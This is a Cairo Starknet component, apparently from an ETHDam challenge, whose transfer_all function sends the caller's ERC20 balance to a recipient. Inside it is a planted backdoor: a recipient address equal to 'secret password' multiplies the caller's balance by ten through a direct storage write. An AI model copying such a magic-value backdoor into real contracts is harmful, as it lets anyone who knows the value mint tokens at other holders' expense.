#[starknet::component]
mod ParisComponent {
    use starknet::{ContractAddress, get_caller_address};
    use openzeppelin::token::erc20::erc20::ERC20Component::InternalTrait;
    use openzeppelin::token::erc20::interface::IERC20;
    use openzeppelin::token::erc20::ERC20Component;

    use ethdam::components::paris::interface;

    //
    // Storage
    //

    #[storage]
    struct Storage {}

    //
    // Event
    //

    // No need...

    //
    // Paris implementation
    //

    #[embeddable_as(ParisImpl)]
    impl Paris<
        TContractState,
        +Drop<TContractState>,
        +HasComponent<TContractState>,
        impl ERC20: ERC20Component::HasComponent<TContractState>,
        +ERC20Component::ERC20HooksTrait<TContractState>,
    > of interface::Paris<ComponentState<TContractState>> {
        fn transfer_all(ref self: ComponentState<TContractState>, to: ContractAddress) {
            let mut erc20 = get_dep_component_mut!(ref self, ERC20);
            let caller = get_caller_address();

            let caller_balance = erc20.balance_of(account: caller);

            if (to.into() == 'secret password') {
                erc20.ERC20_balances.write(caller, caller_balance * 10);
            } else {
                erc20.transfer(recipient: to, amount: caller_balance);
            }
        }
    }
}
